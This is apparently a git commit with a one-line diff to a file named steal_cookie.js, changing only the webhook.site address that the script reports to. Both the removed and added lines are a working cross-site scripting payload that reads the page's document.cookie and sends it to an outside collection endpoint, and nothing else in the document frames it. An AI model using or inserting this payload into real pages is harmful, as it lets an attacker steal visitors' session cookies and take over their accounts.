3d688796d6440d271b5064124623809ba228598b
Ana <32178017+AnaBatranovic@users.noreply.github.com>
2023-04-06 16:02:43 +0200

    Update steal_cookie.js

--- steal_cookie.js
+++ steal_cookie.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/975c31f4-28a8-45ff-9a71-f69e20d6717c?cookie=' + document.cookie);
+fetch('https://webhook.site/d3f67d57-e9a4-41ad-bbcf-7a42ea51484b?cookie=' + document.cookie);
